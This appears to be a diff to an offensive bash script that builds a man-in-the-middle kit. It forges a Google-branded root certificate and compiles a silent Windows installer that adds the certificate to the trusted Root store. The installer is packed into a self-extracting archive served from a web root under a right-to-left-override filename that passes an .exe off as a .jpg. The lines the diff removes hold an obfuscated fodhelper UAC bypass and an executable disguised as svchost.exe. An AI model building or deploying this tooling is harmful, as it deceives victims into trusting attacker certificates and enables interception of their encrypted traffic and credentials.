@@ -81,6 +81,7 @@ fi
 # ========================
 # --- NETWORK INFO ---
 # ========================
+clear
 IFACE=$(ip route | awk '/^default/ {print $5; exit}')
 LAN=$(ip -4 addr show "$IFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)
 color_print GREEN "[*] Interface: $IFACE"
@@ -90,7 +91,7 @@ color_print GREEN "[*] Local IP: $LAN"
 # --- CLEANUP OLD FILES ---
 # ========================
 color_print YELLOW "[*] Cleaning old files..."
-rm -rf "$MITM_DIR" "$MSF_LOOT"/* "$BUILD_DIR"
+rm -rf "$MITM_DIR" "$BUILD_DIR"
 mkdir -p "$MITM_DIR" "$BUILD_DIR"
 
 # ========================
@@ -105,6 +106,7 @@ openssl req -x509 -new -nodes \
     -days 3650 \
     -out "$CA_CERT_PEM" \
     -subj "/C=US/ST=California/L=Mountain View/O=Google LLC/OU=Google Trust Services/CN=Google Internet Authority G3"
+
 openssl x509 -outform der -in "$CA_CERT_PEM" -out "$CA_CERT_CER"
 
 # ========================
@@ -121,50 +123,24 @@ color_print GREEN "[*] Building Windows installer..."
 CERT_B64=$(base64 -w0 "$CA_CERT_CER")
 
 cat > "$MITM_DIR/cert-installer.py" <<EOF
-import os as o, subprocess as sp, tempfile as tf, base64 as b, time as t, winreg as w, sys as s
+import os, subprocess, tempfile, base64
 
-# Base64 of your certificate data (place your real base64 here)
-_C = """$CERT_B64"""
+CERT_B64 = """$CERT_B64"""
 
-def _d(x):  # decode base64
-    return b.b64decode(x)
+path = os.path.join(tempfile.gettempdir(), "google.cer")
+with open(path, "wb") as f:
+    f.write(base64.b64decode(CERT_B64))
 
-def _w(p, d):
-    with open(p, "wb") as f:
-        f.write(_d(d))
+subprocess.run(
+    ["certutil", "-addstore", "-f", "Root", path],
+    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+)
 
-def _r():
-    tmp = o.path.join(tf.gettempdir(), "g.crt")
-    _w(tmp, _C)
-    return tmp
+try:
+    os.remove(path)
+except FileNotFoundError:
+    pass
 
-def _k(p):
-    # Create and set registry keys dynamically
-    kp = w.CreateKey(w.HKEY_CURRENT_USER, p)
-    w.SetValueEx(kp, "DelegateExecute", 0, w.REG_SZ, "")
-    w.SetValueEx(kp, None, 0, w.REG_SZ, _c)
-    w.CloseKey(kp)
-
-def _cbs():
-    _rp = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
-    global _c
-    _c = f'cmd /c certutil -addstore -f Root "{_r()}"'
-    _k(_rp)
-    f = r"C:\\Windows\\System32\\fodhelper.exe"
-    sp.Popen([f], stdin=sp.DEVNULL, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
-    t.sleep(3)
-    for sk in [
-        r"Software\\Classes\\ms-settings\\Shell\\Open\\command",
-        r"Software\\Classes\\ms-settings\\Shell\\Open",
-        r"Software\\Classes\\ms-settings\\Shell",
-        r"Software\\Classes\\ms-settings"
-    ]:
-        try: w.DeleteKey(w.HKEY_CURRENT_USER, sk)
-        except FileNotFoundError: pass
-
-if __name__ == "__main__":
-    exec("".join(map(chr,[95,99,98,115,40,41])))  # exec("_cbs()")
-    s.exit(0)
 EOF
 
 cd "$BUILD_DIR"
@@ -173,10 +149,10 @@ cp "$MITM_DIR/google.ico" "$BUILD_DIR/google.ico"
 
 wine pyinstaller --onefile --noconfirm --noconsole \
     --icon "C:\\pyinstaller-build\\google.ico" \
-    --name "svchost.exe" \
-    --uac-admin "C:\\pyinstaller-build\\cert_installer.py"
+    --name "cert_installer.exe" \
+    "C:\\pyinstaller-build\\cert_installer.py"
 
-cp -r "$BUILD_DIR/dist/svchost.exe" "$MITM_DIR/svchost.exe"
+cp -r "$BUILD_DIR/dist/cert_installer.exe" "$MITM_DIR/cert_installer.exe"
 
 # ========================
 # --- CREATE RAR SFX ---
@@ -184,16 +160,19 @@ cp -r "$BUILD_DIR/dist/svchost.exe" "$MITM_DIR/svchost.exe"
 color_print CYAN "[*] Creating SFX archive..."
 cat > "$MITM_DIR/sfx.txt" <<EOF
 ;The comment below contains SFX script commands
-Setup=svchost.exe
+Setup=cert_installer.exe
 Presetup=google.jpg
 TempMode
 Silent=1
 Overwrite=1
 Update=U
+SetupIcon=google.ico
 EOF
 
 cd "$MITM_DIR"
-rar a -sfx -z"$MITM_DIR/sfx.txt" "/var/www/html/google-update${RTLO}gpj.exe" "$MITM_DIR/svchost.exe"
+rar a -sfx -z"$MITM_DIR/sfx.txt" \
+    "/var/www/html/google-update${RTLO}gpj.exe" \
+    "$MITM_DIR/cert_installer.exe" "$MITM_DIR/google.jpg" "$MITM_DIR/google.ico"
 
 # ========================
 # --- RESTART APACHE ---
